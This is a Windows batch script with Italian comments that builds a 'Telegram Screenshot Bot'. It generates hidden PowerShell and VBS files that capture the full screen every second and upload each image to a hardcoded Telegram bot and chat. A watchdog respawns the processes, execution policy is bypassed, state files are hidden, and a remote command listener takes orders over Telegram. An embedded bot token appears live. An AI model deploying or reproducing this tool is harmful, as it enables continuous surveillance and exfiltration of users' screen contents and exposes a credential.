@echo off
title Telegram Screenshot Bot
setlocal EnableExtensions EnableDelayedExpansion
cd /d "%~dp0"

:: ============================================
:: CONFIGURAZIONE
:: ============================================
set "BOT_TOKEN=8081045018:AAEO7ajGxYpi23xOl-mY7gYYjGNVwGdSxfM"
set "CHAT_ID=8016989344"
set "OFFSET_FILE=%~dp0last_offset.txt"
set "SCREENSHOT_INTERVAL=1"
set "POPUP_FLAG=%TEMP%\tg_popup_shown.flag"
set "PROCESSED_IDS=%TEMP%\tg_processed_ids.txt"
set "WATCHDOG_FLAG=%TEMP%\tg_watchdog_running.flag"
set "BOT_DIR=%~dp0"
set "TEMP_DIR=%TEMP%\tg_bot_%RANDOM%"

:: ============================================
:: CREA CARTELLA TEMPORANEA DEDICATA
:: ============================================
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%" 2>nul

:: ============================================
:: VERIFICA E INSTALLAZIONE jq.exe
:: ============================================
if not exist "%BOT_DIR%jq.exe" (
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/stedolan/jq/releases/download/jq-1.6/jq-win64.exe' -OutFile '%BOT_DIR%jq.exe'" >nul 2>&1
)

set "JQ=%BOT_DIR%jq.exe"
if not exist "%JQ%" exit /b

:: ============================================
:: ELIMINA PROCESSI VECCHI AL RIAVVIO
:: ============================================
taskkill /F /IM wscript.exe /FI "COMMANDLINE like %%tg_watchdog%%" 2>nul
taskkill /F /IM powershell.exe /FI "COMMANDLINE like %%screenshot_sender%%" 2>nul
taskkill /F /IM cmd.exe /FI "COMMANDLINE like %%telegram_listener%%" 2>nul
timeout /t 1 /nobreak >nul

:: ============================================
:: CREAZIONE SCRIPT POWERSHELL PER SCREENSHOT
:: ============================================
(
echo $botToken = '%BOT_TOKEN%'
echo $chatId = '%CHAT_ID%'
echo $sleepTime = %SCREENSHOT_INTERVAL%
echo Add-Type -AssemblyName System.Windows.Forms
echo Add-Type -AssemblyName System.Drawing
echo while($true^) {
echo     try {
echo         $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
echo         $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height^)
echo         $graphics = [System.Drawing.Graphics]::FromImage($bitmap^)
echo         $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size^)
echo         $file = "$env:temp\screenshot_$(Get-Date -f 'yyyyMMdd_HHmmss').jpg"
echo         $bitmap.Save($file, [System.Drawing.Imaging.ImageFormat]::Jpeg^)
echo         $bitmap.Dispose^(^)
echo         $graphics.Dispose^(^)
echo         curl.exe -s -X POST "https://api.telegram.org/bot$botToken/sendPhoto" -F chat_id=$chatId -F photo=@"$file"
echo         Remove-Item "$file" -Force -ErrorAction SilentlyContinue
echo     } catch { }
echo     Start-Sleep -Seconds $sleepTime
echo }
) > "%TEMP_DIR%\screenshot_sender.ps1"

:: ============================================
:: CREAZIONE WATCHDOG MIGLIORATO
:: ============================================
(
echo ' Watchdog Telegram Bot
echo Dim WshShell, objWMIService, colProcesses, botPath, tempDir
echo Set WshShell = CreateObject("WScript.Shell"^)
echo Set objWMIService = GetObject("winmgmts:\\.\root\cimv2"^)
echo botPath = "%BOT_DIR%"
echo tempDir = "%TEMP_DIR%"
echo. 
echo ' Crea file flag per evitare duplicati
echo Dim fso, flagFile
echo Set fso = CreateObject("Scripting.FileSystemObject"^)
echo flagFile = "%WATCHDOG_FLAG%"
echo if fso.FileExists(flagFile^) Then
echo     WScript.Quit
echo Else
echo     fso.CreateTextFile(flagFile^).Close
echo End If
echo.
echo Do While True
echo     On Error Resume Next
echo     ' Controlla screenshot_sender
echo     Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='powershell.exe' AND CommandLine LIKE '%%screenshot_sender.ps1%%'"^)
echo     If Err.Number <> 0 Then
echo         Err.Clear
echo     End If
echo     If colProcesses.Count = 0 Then
echo         WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ ^& tempDir ^& "\screenshot_sender.ps1" ^& """", 0, False
echo         WScript.Sleep 2000
echo     End If
echo     Set colProcesses = Nothing
echo.    
echo     ' Controlla telegram_listener
echo     Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='cmd.exe' AND CommandLine LIKE '%%telegram_listener%%'"^)
echo     If Err.Number <> 0 Then
echo         Err.Clear
echo     End If
echo     If colProcesses.Count = 0 Then
echo         WshShell.Run "cmd.exe /c """ ^& botPath ^& "%~nx0" ^& """ listener", 0, False
echo         WScript.Sleep 2000
echo     End If
echo     Set colProcesses = Nothing
echo.    
echo     ' Controlla se ci sono watchdog duplicati
echo     Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' AND CommandLine LIKE '%%tg_watchdog_main%%'"^)
echo     If Err.Number = 0 Then
echo         If colProcesses.Count > 1 Then
echo             fso.DeleteFile flagFile
echo             WScript.Quit
echo         End If
echo     End If
echo     Set colProcesses = Nothing
echo     On Error GoTo 0
echo     WScript.Sleep 5000
echo Loop
) > "%TEMP_DIR%\tg_watchdog_main.vbs"

:: ============================================
:: CREAZIONE SCRIPT VBS PER POPUP (SENZA ERRORI)
:: ============================================
(
echo Dim WshShell
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Popup WScript.Arguments(0^), WScript.Arguments(1^), WScript.Arguments(2^), CInt(WScript.Arguments(3^)^)
) > "%TEMP_DIR%\show_popup.vbs"

:: ============================================
:: SE ARGOMENTO "listener" AVVIA SOLO IL LISTENER
:: ============================================
if "%1"=="listener" goto :listener_only

:: ============================================
:: AVVIO PRINCIPALE
:: ============================================

:: Mostra UN SOLO popup all'avvio
if not exist "%POPUP_FLAG%" (
    cscript //nologo "%TEMP_DIR%\show_popup.vbs" "Bot Telegram avviato con successo!$\n$\nScreenshot ogni 1 secondo$\nIn ascolto comandi Telegram" 5 "Bot Attivo" 64
    echo > "%POPUP_FLAG%"
    attrib +h "%POPUP_FLAG%" >nul 2>&1
)

:: Avvia watchdog
start /B wscript.exe //nologo "%TEMP_DIR%\tg_watchdog_main.vbs"

:: Avvia screenshot sender
start /B powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP_DIR%\screenshot_sender.ps1"

:: Avvia listener in background
start /B cmd.exe /c "%~f0" listener

:: Chiudi questa finestra
exit

:: ============================================
:: LISTENER TELEGRAM
:: ============================================
:listener_only

:: Inizializza file per tracciare gli ID
if not exist "%PROCESSED_IDS%" (
    echo. > "%PROCESSED_IDS%" 2>nul
)

:: Inizializza offset
set "OFFSET=0"
if exist "%OFFSET_FILE%" set /p OFFSET=<"%OFFSET_FILE%" 2>nul
set /a OFFSET=OFFSET+0 >nul 2>&1
if errorlevel 1 set "OFFSET=0"

:: Sincronizza offset iniziale
set "TMP_JSON=%TEMP_DIR%\tg_updates.json"
set "TMP_TSV=%TEMP_DIR%\tg_parse.tsv"

curl.exe -s -G "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" --data-urlencode "offset=%OFFSET%" --data-urlencode "timeout=1" > "%TMP_JSON%" 2>nul
for /f %%U in ('"%JQ%" -r ".result[-1].update_id // empty" "%TMP_JSON%" 2^>nul') do set /a OFFSET=%%U+1
> "%OFFSET_FILE%" echo !OFFSET! 2>nul
attrib +h "%OFFSET_FILE%" >nul 2>&1

:listen_loop
curl.exe -s -G "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" --data-urlencode "offset=%OFFSET%" --data-urlencode "timeout=10" > "%TMP_JSON%" 2>nul
if errorlevel 1 (
    timeout /t 2 /nobreak >nul
    goto :listen_loop
)

"%JQ%" -r ".result[]? | [(.update_id|tostring), ((.message.text // .edited_message.text // .callback_query.data // .message.caption // .edited_message.caption // \"\")|gsub(\"[\r\n]+\"; \" \"))] | @tsv" "%TMP_JSON%" > "%TMP_TSV%" 2>nul
if errorlevel 1 (
    timeout /t 2 /nobreak >nul
    goto :listen_loop
)

for /f "usebackq tokens=1,* delims=	" %%A in ("%TMP_TSV%") do (
    set "UPD=%%A"
    set "TEXT=%%B"
    
    :: VERIFICA SE L'ID È GIÀ STATO PROCESSATO
    findstr /x "!UPD!" "%PROCESSED_IDS%" >nul 2>&1
    if errorlevel 1 (
        echo !UPD! >> "%PROCESSED_IDS%" 2>nul
        
        :: Mostra UN SOLO popup
        cscript //nologo "%TEMP_DIR%\show_popup.vbs" "Messaggio ricevuto:$\n$\n!TEXT!" 5 "Telegram Bot" 64
        
        :: Elaborazione comandi
        if /i "!TEXT!"=="/stop" (
            cscript //nologo "%TEMP_DIR%\show_popup.vbs" "Arresto del bot in corso..." 3 "Stop" 48
            taskkill /F /IM wscript.exe /FI "COMMANDLINE like %%tg_watchdog%%" 2>nul
            taskkill /F /IM powershell.exe /FI "COMMANDLINE like %%screenshot_sender%%" 2>nul
            taskkill /F /IM cmd.exe /FI "COMMANDLINE like %%telegram_listener%%" 2>nul
            curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="Bot arrestato" >nul 2>&1
            del "%POPUP_FLAG%" 2>nul
            del "%PROCESSED_IDS%" 2>nul
            del "%WATCHDOG_FLAG%" 2>nul
            rmdir /s /q "%TEMP_DIR%" 2>nul
            exit
        )
        
        if /i "!TEXT!"=="/status" (
            curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="Bot attivo. Screenshot ogni %SCREENSHOT_INTERVAL% secondo." >nul 2>&1
        )
        
        if /i "!TEXT!"=="/help" (
            curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="Comandi: /stop - Arresta /status - Stato /help - Aiuto" >nul 2>&1
        )
    )
    
    :: Aggiorna offset
    set /a OFFSET=!UPD!+1
    > "%OFFSET_FILE%" echo !OFFSET! 2>nul
    attrib +h "%OFFSET_FILE%" >nul 2>&1
)

timeout /t 1 /nobreak >nul
goto :listen_loop
